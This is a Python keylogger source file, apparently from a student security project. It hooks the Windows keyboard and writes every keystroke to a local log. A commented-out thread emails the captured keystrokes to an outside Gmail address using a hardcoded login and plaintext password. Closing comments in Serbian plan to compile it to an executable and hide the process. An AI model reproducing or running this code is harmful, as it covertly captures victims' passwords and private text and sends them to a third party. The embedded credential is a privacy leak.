import pythoncom, pyHook
import os
import sys
import threading
import smtplib
import datetime,time

data = ''

def keyPressed(event):
    global data

    key = chr(event.Ascii)
    data = data + key

    if len(data) > 10:
        fp = open("C:\\Users\\Milos Milovanovic\\Desktop\\Sbes proj\\sigurnost\\log.txt", "a")
        fp.write(data)
        fp.close()
        data = ''

    return True

obj = pyHook.HookManager()
obj.KeyDown = keyPressed
obj.HookKeyboard()
pythoncom.PumpMessages()

'''
#Email Logs
class TimerClass(threading.Thread):
    def __init__(self):
        threading.Thread.__init__(self)
        self.event = threading.Event()
    def run(self):
        while not self.event.is_set():
            global data
            if len(data)>10:
                ts = datetime.datetime.now()
                SERVER = "smtp.gmail.com" #Specify Server Here
                PORT = 587 #Specify Port Here
                USER="mmilos015@gmail.com"#Specify Username Here 
                PASS="milos milovanovic je iz kljajiceva123"#Specify Password Here
                FROM = USER#From address is taken from username
                TO = "milovanovicmmilos99@gmail.com" #Specify to address.Use comma if more than one to address is needed.
                SUBJECT = "Keylogger data: "+str(ts)
                MESSAGE = data
                message = """\
From: %s
To: %s
Subject: %s
%s
""" % (FROM, TO, SUBJECT, MESSAGE)
                try:
                    server = smtplib.SMTP()
                    server.connect(SERVER,PORT)
                    print('Uspesno povezan na server')
                    server.starttls()
                    server.login(USER,PASS)
                    print('Uspesno ulogovan')
                    server.sendmail(FROM, TO, message)
                    data=''
                    server.quit()
                except Exception as e:
                    print(e)
            self.event.wait(120)
'''

# 1. SKRIPTU KOMPAJLIRATI U EXE FAJL POMOCU PYINSTALLERA
# 2. UBACITI FUNKCIONALNOST SLANJA DUMPA NA MAIL ACCOUNT
# 3. MOZDA SKONTATI KAKO PRIKRITI PROCES